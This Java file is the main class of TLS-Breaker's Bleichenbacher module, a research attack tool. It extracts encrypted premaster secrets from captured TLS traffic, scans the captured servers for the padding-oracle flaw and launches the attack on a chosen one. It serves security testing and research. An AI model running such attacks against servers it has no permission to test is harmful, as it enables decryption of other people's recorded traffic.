/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.bleichenbacher;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.ParameterException;
import de.rub.nds.tlsattacker.core.config.TLSDelegateConfig;
import de.rub.nds.tlsattacker.core.config.delegate.GeneralDelegate;
import de.rub.nds.tlsbreaker.bleichenbacher.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsbreaker.bleichenbacher.impl.BleichenbacherAttacker;
import de.rub.nds.tlsbreaker.bleichenbacher.impl.ServerSelection;
import de.rub.nds.tlsbreaker.breakercommons.config.delegate.GeneralAttackDelegate;
import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
import de.rub.nds.tlsbreaker.breakercommons.util.file.FileUtils;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapAnalyzer;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapSession;
import org.apache.commons.codec.binary.Hex;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.*;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

/**
 *
 */
public class Main {

    private static final Logger LOGGER = LogManager.getLogger();

    /**
     * @param args
     */
    public static void main(String[] args) {
        GeneralDelegate generalDelegate = new GeneralAttackDelegate();
        BleichenbacherCommandConfig bleichenbacherCommandConfig = new BleichenbacherCommandConfig(generalDelegate);

        JCommander jc = JCommander.newBuilder().addObject(bleichenbacherCommandConfig).build();
        try {
            jc.parse(args);
        } catch (ParameterException ex) {
            ex.usage();
            return;
        }

        if (generalDelegate.isHelp()) {
            jc.usage();
            return;
        }

        // TODO: For testing
        if (bleichenbacherCommandConfig.getPcapFileLocation() != null) {
            if (FileUtils.isFileExists(bleichenbacherCommandConfig.getPcapFileLocation())) {
                try {
                    handlePcapFile(bleichenbacherCommandConfig);
                    return;
                } catch (UnsupportedOperationException e) {
                    CONSOLE.error("Invalid option selected!");
                    return;
                }
            } else {
                CONSOLE.error("Invalid File Path!");
                return;
            }
        }
        checkVulnerabilityOrExecuteAttack(bleichenbacherCommandConfig);
    }

    private static void handlePcapFile(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        PcapAnalyzer pcapAnalyzer = new PcapAnalyzer(bleichenbacherCommandConfig.getPcapFileLocation());
        List<PcapSession> sessions = pcapAnalyzer.getAllSessions();

        if (sessions != null || !sessions.isEmpty()) {
            ServerSelection serverSelection = new ServerSelection();
            String userOption = serverSelection.getUserSelectedServer(sessions);
            if ("a".equals(userOption)) {
                List<String> uniqueServers = serverSelection.getUniqueServers(sessions);
                checkVulnerabilityOfAllServersAndDisplay(uniqueServers, bleichenbacherCommandConfig, pcapAnalyzer,
                    sessions);
            } else {
                // TODO: place this in else block?
                bleichenbacherCommandConfig.getClientDelegate().setHost(userOption);
                bleichenbacherCommandConfig
                    .setEncryptedPremasterSecret(getPreMasterSecret(pcapAnalyzer, sessions, userOption));

                checkVulnerabilityOrExecuteAttack(bleichenbacherCommandConfig);
            }
        } else {
            // TODO: throw exception
        }
    }

    private static void checkVulnerabilityOfAllServersAndDisplay(List<String> uniqueServers,
        BleichenbacherCommandConfig bleichenbacherCommandConfig, PcapAnalyzer pcapAnalyzer,
        List<PcapSession> sessions) {
        List<String> vulnerableServers =
            getVulnerableServers(uniqueServers, bleichenbacherCommandConfig, pcapAnalyzer, sessions);
        displayVulnerableServers(vulnerableServers);
        if (!vulnerableServers.isEmpty()) {
            CONSOLE.info("Please select a server number to attack.");
            CONSOLE.info("server number: ");
            String serverToAttack = getServerToAttack(vulnerableServers);
            executeAttack(serverToAttack, bleichenbacherCommandConfig);
        }

    }

    private static void executeAttack(String serverToAttack, BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        Attacker<? extends TLSDelegateConfig> attacker =
            new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        attacker.attack();
    }

    private static String getServerToAttack(List<String> vulnerableServers) {
        String selectedServer = null;
        Scanner sc = new Scanner(System.in);
        try {
            int serverNumber = sc.nextInt();
            if (serverNumber > 0 & serverNumber <= vulnerableServers.size()) {
                selectedServer = vulnerableServers.get(serverNumber - 1);
                LOGGER.info("Selected server: " + selectedServer);
            } else {
                throw new UnsupportedOperationException();
            }

        } catch (Exception e) {
            throw new UnsupportedOperationException();
        }

        return selectedServer;
    }

    private static List<String> getVulnerableServers(List<String> uniqueServers,
        BleichenbacherCommandConfig bleichenbacherCommandConfig, PcapAnalyzer pcapAnalyzer,
        List<PcapSession> sessions) {

        List<String> vulnerableServers = new ArrayList<>();
        for (String server : uniqueServers) {
            bleichenbacherCommandConfig.getClientDelegate().setHost(server);
            bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(pcapAnalyzer, sessions, server));

            Attacker<? extends TLSDelegateConfig> attacker =
                new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());

            try {
                Boolean result = attacker.checkVulnerability();
                if (Objects.equals(result, Boolean.TRUE)) {
                    CONSOLE.error("Vulnerable:" + result.toString());
                    vulnerableServers.add(server);
                } /*
                   * else if (Objects.equals(result, Boolean.FALSE)) { CONSOLE.info("Vulnerable:" + result.toString());
                   * } else { CONSOLE.warn("Vulnerable: Uncertain"); }
                   */
            } catch (UnsupportedOperationException e) {
                LOGGER.info("The selected attacker is currently not implemented");
            }
        }
        return vulnerableServers;
    }

    private static void displayVulnerableServers(List<String> vulnerableServers) {

        CONSOLE.info("Found " + vulnerableServers.size() + " server that are vulnerable.");
        for (int i = 0; i < vulnerableServers.size(); i++) {
            CONSOLE.info(i + 1 + ") " + vulnerableServers.get(i));
        }
        // CONSOLE.info("Select Option: ");
    }

    private static void checkVulnerabilityOrExecuteAttack(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        Attacker<? extends TLSDelegateConfig> attacker =
            new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        // TODO: Remove log
        CONSOLE.info("Pcap file location = " + bleichenbacherCommandConfig.getPcapFileLocation());

        if (attacker.getConfig().isExecuteAttack()) {
            attacker.attack();
        } else {
            try {
                Boolean result = attacker.checkVulnerability();
                if (Objects.equals(result, Boolean.TRUE)) {
                    CONSOLE.error("Vulnerable:" + result.toString());
                } else if (Objects.equals(result, Boolean.FALSE)) {
                    CONSOLE.info("Vulnerable:" + result.toString());
                } else {
                    CONSOLE.warn("Vulnerable: Uncertain");
                }
            } catch (UnsupportedOperationException e) {
                LOGGER.info("The selected attacker is currently not implemented");
            }
        }
    }

    private static String getPreMasterSecret(PcapAnalyzer pcapAnalyzer, List<PcapSession> sessions,
        String serverToAttack) {
        String preMasterSecret = null;
        Optional<PcapSession> filteredPcapSession = sessions.stream()
            .filter(pcapSession -> serverToAttack.equals(pcapSession.getDestinationHost())).findFirst();

        if (filteredPcapSession.isPresent()) {
            byte[] pms = pcapAnalyzer.getPreMasterSecret(filteredPcapSession.get().getClientKeyExchangeMessage());
            preMasterSecret = new String(Hex.encodeHex(pms));
        }

        return preMasterSecret;
    }
}
